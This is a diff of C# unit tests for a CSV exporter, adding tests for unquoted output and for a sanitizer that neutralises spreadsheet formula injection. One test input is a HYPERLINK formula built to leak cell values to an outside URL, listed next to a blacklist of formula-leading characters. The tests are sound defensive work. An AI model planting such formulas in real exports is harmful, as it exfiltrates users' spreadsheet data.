@@ -101,15 +101,6 @@ namespace DelimitedDataParser
         }
 
         [Fact]
-        public void Fails_With_Invalid_Settings()
-        {
-            var exporter = new Exporter();
-            exporter.IncludeEscapeCharacters = false;
-
-            Assert.Throws<InvalidOperationException>(() => exporter.ExportToString(CreateDataTable()));
-        }
-
-        [Fact]
         public void Fails_Without_Valid_Input()
         {
             using (var writer = new StringWriter())
@@ -556,6 +547,110 @@ namespace DelimitedDataParser
                 @"""One"",""Two""" + Environment.NewLine
                 + @"""""""Three"""""",""Four""" + Environment.NewLine
                 + @"""Five"",""Six""",
+                output);
+        }
+
+        [Fact]
+        public void Exports_Unquoted_Data()
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, "Three", "Four");
+            AddRow(input, "Five", "Six");
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + "Three,Four" + Environment.NewLine
+                + "Five,Six",
+                output);
+        }
+
+        [Theory]
+        [InlineData("=", "'=")]
+        [InlineData("+", "'+")]
+        [InlineData("-", "'-")]
+        [InlineData("@", "'@")]
+        [InlineData(@"=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")", @"'=HYPERLINK(""http://example.com?leak=""&A1&A2, ""Click here"")")]
+        public void Sanitizer_Escapes_Blacklisted_Characters(string inputString, string expectedOutput)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SanitizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + string.Concat(expectedOutput + ",", expectedOutput),
+                output);
+        }
+
+        [Theory]
+        [InlineData("abcdef")]
+        [InlineData("abc + def - ghi @ jkl")]
+        [InlineData(" =")]
+        [InlineData(" +")]
+        [InlineData(" -")]
+        [InlineData(" @")]
+        public void Sanitizer_Does_Not_Escape_Safe_Input(string inputString)
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, inputString, inputString);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SanitizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + string.Concat(inputString + ",", inputString),
+                output);
+        }
+
+        [Fact]
+        public void Sanitizer_Ignores_Null_Values()
+        {
+            var input = CreateDataTable();
+            AddColumn(input, "One");
+            AddColumn(input, "Two");
+
+            AddRow(input, null, null);
+
+            var exporter = new Exporter
+            {
+                IncludeEscapeCharacters = false,
+                SanitizeStrings = true
+            };
+
+            var output = exporter.ExportToString(input);
+
+            Assert.Equal(
+                "One,Two" + Environment.NewLine
+                + ",",
                 output);
         }
 
